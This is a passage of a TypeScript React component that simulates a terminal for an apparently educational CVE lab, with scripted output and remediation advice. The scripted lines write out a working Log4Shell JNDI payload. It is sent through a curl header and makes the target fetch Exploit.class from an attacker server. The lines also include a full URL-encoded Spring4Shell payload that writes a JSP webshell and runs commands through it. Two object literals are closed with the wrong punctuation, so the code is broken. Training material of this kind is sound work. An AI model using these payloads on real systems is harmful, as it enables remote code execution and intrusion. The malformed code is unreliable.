        { text: "[SCAN] Scanning CVE simulation infrastructure...", type: "info" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Victim A (10.0.3.{LAB_IP}):", type: "info" },
        { text: "[SCAN]   8080/tcp  open  http  Apache Tomcat 9.0.50", type: "success" },
        { text: "[SCAN]   App: Java 8 + Log4j 2.14.1 (VULNERABLE)", type: "error" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Victim B (10.0.3.{LAB_IP2}):", type: "info" },
        { text: "[SCAN]   8080/tcp  open  http  Spring Boot 2.6.5", type: "success" },
        { text: "[SCAN]   Framework: Spring Framework 5.3.17 (VULNERABLE)", type: "error" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Attacker (10.0.3.99):", type: "info" },
        { text: "[SCAN]   1389/tcp  open  ldap   Rogue LDAP Server", type: "warning" },
        { text: "[SCAN]   8888/tcp  open  http   Payload delivery server", type: "warning" },
        { text: "[AI] Both targets running known-vulnerable software versions", type: "ai" },
      ],
    },
    log4shell: {
      lines: [
        { text: "[ATK] ═══ CVE-2021-44228 — Log4Shell Exploit Demo ═══", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Vulnerability: Apache Log4j2 JNDI Remote Code Execution", type: "info" },
        { text: "[ATK] CVSS: 10.0 (CRITICAL) | Affected: Log4j 2.0-beta9 → 2.14.1", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Start attacker LDAP server", type: "info" },
        { text: "[ATK] $ java -jar RogueJndi-1.0.jar -i 10.0.3.99 -c \"touch /tmp/pwned\"", type: "warning" },
        { text: "[ATK] ✓ LDAP server listening on 10.0.3.99:1389", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Send JNDI lookup payload to target", type: "info" },
        { text: "[ATK] Payload: ${jndi:ldap://10.0.3.99:1389/Exploit}", type: "warning" },
        { text: "[ATK] Inject via HTTP header:", type: "info" },
        { text: "[ATK]   curl -H 'X-Api-Version: ${jndi:ldap://10.0.3.99:1389/Exploit}' http://10.0.3.{LAB_IP}:8080/", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Target logs the header → Log4j resolves JNDI", type: "info" },
        { text: "[ATK] [LDAP] Connection from 10.0.3.{LAB_IP}:42132", type: "success" },
        { text: "[ATK] [LDAP] Sending LDAP redirect to http://10.0.3.99:8888/Exploit.class", type: "info" },
        { text: "[ATK] [HTTP] Victim fetched Exploit.class from attacker server", type: "success" },
        { text: "[ATK] [JAVA] Exploit.class loaded and executed in target JVM", type: "error" />,
        { text: "", type: "system" },
        { text: "[ATK] Step 4: Verify code execution", type: "info" },
        { text: "[ATK] $ ls -la /tmp/pwned  → -rw-r--r-- 1 tomcat tomcat 0 ... /tmp/pwned", type: "success" },
        { text: "[ATK] ✓ Remote code execution via Log4Shell confirmed", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  LOG4SHELL — FLAG CAPTURED                        ║", type: "success" },
        { text: "║   FLAG: CV{l0g4sh3ll_jnd1_rc3_cve202144228}          ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
        { text: "", type: "system" },
        { text: "[AI] This vulnerability affected millions of Java applications worldwide", type: "ai" },
        { text: "[AI] Attack chain: User input → Log4j logging → JNDI resolution → LDAP/RMI → RCE", type: "ai" },
      ],
    },
    spring4: {
      lines: [
        { text: "[ATK] ═══ CVE-2022-22965 — Spring4Shell Exploit Demo ═══", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Vulnerability: Spring Framework RCE via Data Binding", type: "info" },
        { text: "[ATK] CVSS: 9.8 (CRITICAL) | Affected: Spring 5.3.0-5.3.17 + JDK 9+", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Identify Spring application", type: "info" },
        { text: "[ATK] Target: 10.0.3.{LAB_IP2}:8080 (Spring Boot 2.6.5)", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Exploit class loader manipulation via data binding", type: "info" },
        { text: "[ATK] Payload (modify Tomcat logging via class.module.classLoader):", type: "warning" },
        { text: "[ATK] GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Access deployed webshell", type: "info" },
        { text: "[ATK] GET /tomcatwar.jsp?pwd=j&cmd=id", type: "warning" },
        { text: "[ATK] Response: uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)", type: "success" },
        { text: "[ATK] ✓ Webshell deployed via Spring data binding RCE", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  SPRING4SHELL — FLAG CAPTURED                     ║", type: "success" },
        { text: "║   FLAG: CV{spr1ng4sh3ll_d4t4_b1nd1ng_rc3}            ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
        { text: "", type: "system" },
        { text: "[AI] Spring4Shell exploits Java 9+ module access via classLoader property", type: "ai" },
        { text: "[AI] Fix: Upgrade to Spring Framework 5.3.18+ / 5.2.21+", type: "ai" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running CVE vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌──────────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │               Vulnerability Assessment Report              │", type: "ai" },
        { text: "[AI] ├──────────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ CVE-2021-44228 (Log4Shell)  : CVSS 10.0 — JNDI RCE      │", type: "error" },
        { text: "[AI] │ CVE-2022-22965 (Spring4)    : CVSS  9.8 — Data binding  │", type: "error" },
        { text: "[AI] │ CVE-2024-3094  (XZ Backdoor): CVSS 10.0 — Supply chain  │", type: "error" },
        { text: "[AI] │ CVE-2023-44487 (HTTP/2 RST) : CVSS  7.5 — DDoS          │", type: "warning" },
        { text: "[AI] └──────────────────────────────────────────────────────────┘", type: "ai" },
        { text: "[AI] All are real-world critical vulnerabilities with massive impact", type: "ai" },
        { text: "[AI] Key lesson: Always keep dependencies updated and monitor CVE feeds", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ CVE Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] Log4Shell (CVE-2021-44228):", type: "success" },
        { text: "[DEF]   → Upgrade Log4j to 2.17.1+ immediately", type: "success" },
        { text: "[DEF]   → Set log4j2.formatMsgNoLookups=true (mitigation)", type: "success" ],
        { text: "[DEF]   → WAF rule: block ${jndi: patterns in all inputs/headers", type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] Spring4Shell (CVE-2022-22965):", type: "info" },
        { text: "[DEF]   → Upgrade Spring Framework to 5.3.18+ / 5.2.21+", type: "info" },
        { text: "[DEF]   → Downgrade to JDK 8 (not affected by classLoader access)", type: "info" },
        { text: "[DEF]   → Disallow class.module.classLoader property binding", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] General CVE Response:", type: "info" },
        { text: "[DEF]   → Subscribe to CVE alerts (NVD, vendor advisories)", type: "info" },
        { text: "[DEF]   → Automate dependency scanning (Dependabot, Snyk, Trivy)", type: "info" },
        { text: "[DEF]   → Implement incident response plan for zero-day disclosure", type: "info" },
        { text: "[DEF]   → Network segmentation limits blast radius of RCE", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ CVE Simulation Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container 1: RUNNING (log4shell-victim) — Java 8 + Log4j 2.14.1", type: "success" },
        { text: "[STATUS]   Container 2: RUNNING (spring4shell-app) — Spring 5.3.17", type: "success" },
        { text: "[STATUS]   Container 3: RUNNING (attacker-infra) — LDAP/RMI + HTTP", type: "success" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
        { text: "[STATUS]   WARNING:   Real-world critical vulnerabilities in scope", type: "error" },
      ],
    },
  },
};

/* ---------- 通用兜底命令 ---------- */
const DEFAULT_COMMANDS: Record<string, CmdResponse> = {
  help: {
    lines: [
      { text: "┌─────────────────────────────────────────────┐", type: "system" },
      { text: "│ Available Commands:                          │", type: "system" },
      { text: "│  scan      — Port scan target system        │", type: "info" },
      { text: "│  exploit   — Launch attack vector           │", type: "warning" },
      { text: "│  analyze   — AI vulnerability analysis      │", type: "ai" },
      { text: "│  defend    — Show defense & remediation     │", type: "ai" },
      { text: "│  status    — Check lab environment status   │", type: "info" },
      { text: "│  clear     — Clear terminal                 │", type: "system" },
      { text: "│  exit      — Terminate lab session          │", type: "error" },
      { text: "└─────────────────────────────────────────────┘", type: "system" },
    ],
  },
  scan: {
    lines: [
      { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
      { text: "[SCAN] PORT      STATE   SERVICE", type: "system" },
      { text: "[SCAN] 22/tcp    open    ssh", type: "success" },
      { text: "[SCAN] 80/tcp    open    http", type: "success" },
      { text: "[SCAN] 443/tcp   open    https", type: "success" },
      { text: "[SCAN] Scan complete — 3 open ports", type: "info" },
    ],
  },
  exploit: {
    lines: [
      { text: "[ATK] Launching attack vector...", type: "warning" },
      { text: "[ATK] Target: 10.0.3.{LAB_IP}", type: "info" },
      { text: "[ATK] ✓ Attack successful — FLAG: CV{g3n3r1c_l4b_fl4g}", type: "success" },
      { text: "[AI] Vulnerability confirmed — see 'defend' for remediation", type: "ai" },
    ],
  },
  analyze: {
    lines: [
      { text: "[AI] Running vulnerability analysis...", type: "ai" },
      { text: "[AI] Assessment: Vulnerability confirmed in target application", type: "ai" },
      { text: "[AI] Type 'defend' for remediation guidance", type: "ai" },
    ],
  },
  defend: {
    lines: [
      { text: "[AI] Defense & Remediation:", type: "ai" },
      { text: "[AI] 1. Validate and sanitize all user inputs", type: "success" },
      { text: "[AI] 2. Apply principle of least privilege", type: "success" },
      { text: "[AI] 3. Keep dependencies updated", type: "info" },
      { text: "[AI] 4. Implement defense in depth (WAF + IDS + monitoring)", type: "info" },
    ],
  },
  status: {
    lines: [
      { text: "[STATUS] Lab Environment: RUNNING", type: "success" },
      { text: "[STATUS] Target: 10.0.3.{LAB_IP}", type: "info" },
      { text: "[STATUS] AI Engine: ACTIVE", type: "ai" },
    ],
  },
};

/* ======================================================================
   颜色映射
   ====================================================================== */
const LINE_COLORS: Record<TermLine["type"], string> = {
  system: "text-zinc-500",
  success: "text-green-400",
  error: "text-red-400",
  warning: "text-yellow-400",
  input: "text-cyan-300",
  info: "text-cyan-400/80",
  ai: "text-purple-400",
};

const ACCENT_MAP = {
  cyan: { border: "border-cyan-500/30", glow: "shadow-[0_0_60px_#00f0ff15]", header: "bg-cyan-500/10" },
  danger: { border: "border-red-500/30", glow: "shadow-[0_0_60px_#ff004015]", header: "bg-red-500/10" },
  matrix: { border: "border-green-500/30", glow: "shadow-[0_0_60px_#00ff4115]", header: "bg-green-500/10" },
  purple: { border: "border-purple-500/30", glow: "shadow-[0_0_60px_#a855f715]", header: "bg-purple-500/10" },
  warn: { border: "border-yellow-500/30", glow: "shadow-[0_0_60px_#ffb80015]", header: "bg-yellow-500/10" },
};

/* ======================================================================
   组件
   ====================================================================== */
export default function TerminalSimulator({ labId, labTitle, color, onClose }: TerminalSimulatorProps) {
  const [lines, setLines] = useState<TermLine[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [isInitializing, setIsInitializing] = useState(true);
  const [isTyping, setIsTyping] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const lineIdRef = useRef(0);
  const accent = ACCENT_MAP[color];

  /* 生成时间戳 */
  const getTimestamp = useCallback(() => {
    const now = new Date();
    return `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}`;
  }, []);

  /* 滚动到底部 */
  const scrollToBottom = useCallback(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, []);

  /* 添加一行 */
  const addLine = useCallback(
    (text: string, type: TermLine["type"]) => {
      lineIdRef.current += 1;
      setLines((prev) => [...prev, { id: lineIdRef.current, text, type, timestamp: getTimestamp() }]);
    },
    [getTimestamp]
  );

  /* 初始化序列 — 打字机效果 */
  useEffect(() => {
    let cancelled = false;
    let currentDelay = 400;

    const initSequence = LAB_INIT[labId] || DEFAULT_INIT;
    const containerId = Math.random().toString(36).substring(2, 10);
    const labIp = 100 + Math.floor(Math.random() * 150);
    const labIp2 = 150 + Math.floor(Math.random() * 50);

    const runInit = async () => {
      for (const step of initSequence) {
        if (cancelled) return;
        await new Promise((r) => setTimeout(r, step.delay));
        if (cancelled) return;

        const text = step.text
          .replace("{LAB_IP}", String(labIp))
          .replace("{LAB_IP2}", String(labIp2))
          .replace("{CONTAINER_ID}", containerId)
          .replace("{LAB_ID}", labId.toUpperCase());
        addLine(text, step.type);
        scrollToBottom();
      }
      if (!cancelled) {
        setIsInitializing(false);
      }
    };

    runInit();
    return () => {
      cancelled = true;
    };
  }, [labId, addLine, scrollToBottom]);

  /* 自动滚动 */
  useEffect(() => {
    scrollToBottom();
  }, [lines, scrollToBottom]);

  /* 聚焦输入框 */
  useEffect(() => {
    if (!isInitializing && inputRef.current) {
      inputRef.current.focus();
    }
  }, [isInitializing]);

  /* 处理命令 */
  const handleCommand = useCallback(
    (cmd: string) => {
      const trimmed = cmd.trim().toLowerCase();
      addLine(`operator@cybervse:~$ ${cmd}`, "input");
      scrollToBottom();

      if (trimmed === "clear") {
        setLines([]);
        return;
      }

      if (trimmed === "exit") {
        addLine("[SYS] Terminating lab session...", "warning");
        setTimeout(() => onClose(), 800);
        return;
      }

      /* 优先匹配靶场专属命令，回退到通用命令 */
      const labCmds = LAB_COMMANDS[labId];
      const response = labCmds?.[trimmed] || DEFAULT_COMMANDS[trimmed];
      if (response) {
        setIsTyping(true);
        let idx = 0;
        const containerId = Math.random().toString(36).substring(2, 10);
        const labIp = 100 + Math.floor(Math.random() * 150);
        const labIp2 = 150 + Math.floor(Math.random() * 50);
        const interval = setInterval(() => {
          if (idx < response.lines.length) {
            const text = response.lines[idx].text
              .replace("{LAB_IP}", String(labIp))
              .replace("{LAB_IP2}", String(labIp2))
              .replace("{CONTAINER_ID}", containerId);
            addLine(text, response.lines[idx].type);
            scrollToBottom();
            idx++;
          } else {
            clearInterval(interval);
            setIsTyping(false);
          }
        }, 120);
      } else {
        addLine(`-bash: ${trimmed}: command not found. Type "help" for available commands.`, "error");
      }
    },
    [labId, addLine, scrollToBottom, onClose]
  );

  /* 提交 */
  const handleSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      if (!inputValue.trim() || isInitializing || isTyping) return;
      handleCommand(inputValue);
      setInputValue("");
    },
    [inputValue, isInitializing, isTyping, handleCommand]
  );

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6">
      {/* 遮罩 */}
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={onClose} />

      {/* 终端窗口 */}
      <div
        className={`
          relative w-full max-w-4xl h-[85vh] max-h-[700px]
          flex flex-col rounded-xl overflow-hidden
          border ${accent.border} ${accent.glow}
          bg-[#0a0a0f]
        `}
      >
        {/* ===== 终端头部 ===== */}
        <div className={`flex items-center justify-between px-4 py-2.5 border-b ${accent.border} ${accent.header}`}>
          <div className="flex items-center gap-3">
            {/* 三色点 */}
            <div className="flex items-center gap-1.5">
              <button
                onClick={onClose}
                className="w-3 h-3 rounded-full bg-red-500/70 hover:bg-red-400 transition-colors"
              />
              <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
              <span className="w-3 h-3 rounded-full bg-green-500/70" />
            </div>
            <span className="font-mono text-[10px] text-zinc-500 tracking-wider">
              {labTitle} — Terminal Session
            </span>
          </div>

          <div className="flex items-center gap-4">
            {isInitializing && (
              <span className="flex items-center gap-1.5 font-mono text-[10px] text-yellow-400">
                <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" />
                INITIALIZING
              </span>
            )}
            {!isInitializing && (
              <span className="flex items-center gap-1.5 font-mono text-[10px] text-green-400">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-breathe" />
                CONNECTED
              </span>
            )}
            <button
              onClick={onClose}
              className="font-mono text-[10px] text-zinc-600 hover:text-red-400 transition-colors px-2 py-1 border border-zinc-800 rounded hover:border-red-500/30"
            >
              ✕ EXIT
            </button>
          </div>
        </div>

        {/* ===== 终端内容 ===== */}
        <div
          ref={scrollRef}
          className="flex-1 overflow-y-auto p-4 font-mono text-xs leading-relaxed space-y-0.5"
          onClick={() => inputRef.current?.focus()}
        >
          {lines.map((line) => (
            <div key={line.id} className="flex gap-2">
              <span className="text-zinc-700 shrink-0 select-none">{line.timestamp}</span>
              <span className={`${LINE_COLORS[line.type]} break-all`}>{line.text}</span>
            </div>
          ))}

          {/* 输入行 */}
          {!isInitializing && (
            <form onSubmit={handleSubmit} className="flex items-center gap-2 mt-1">
              <span className="text-cyan-400 shrink-0">operator@cybervse:~$</span>
              <input
                ref={inputRef}
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                disabled={isTyping}
                className="flex-1 bg-transparent text-cyan-300 outline-none caret-cyan-400 disabled:opacity-50"
                spellCheck={false}
                autoComplete="off"
              />
              <span className="animate-blink-cursor text-cyan-400">▌</span>
            </form>
          )}

          {/* 初始化中的光标 */}
          {isInitializing && (
            <div className="flex items-center gap-1 mt-1">
              <span className="text-yellow-400 text-xs">$</span>
              <span className="animate-blink-cursor text-yellow-400">▌</span>
            </div>
          )}
        </div>

        {/* ===== 底部状态栏 ===== */}
        <div className={`flex items-center justify-between px-4 py-1.5 border-t ${accent.border} bg-zinc-950/50`}>
          <div className="flex items-center gap-4 font-mono text-[9px] text-zinc-600">
            <span>LAB: {labId.toUpperCase()}</span>
            <span>USER: OPERATOR</span>
            <span>ACCESS: TRAINING</span>
          </div>
          <div className="flex items-center gap-3 font-mono text-[9px]">
            <span className="text-purple-400">AI: ACTIVE</span>
            <span className="text-green-400">SANDBOX: ISOLATED</span>
          </div>
        </div>
      </div>
    </div>
  );
}
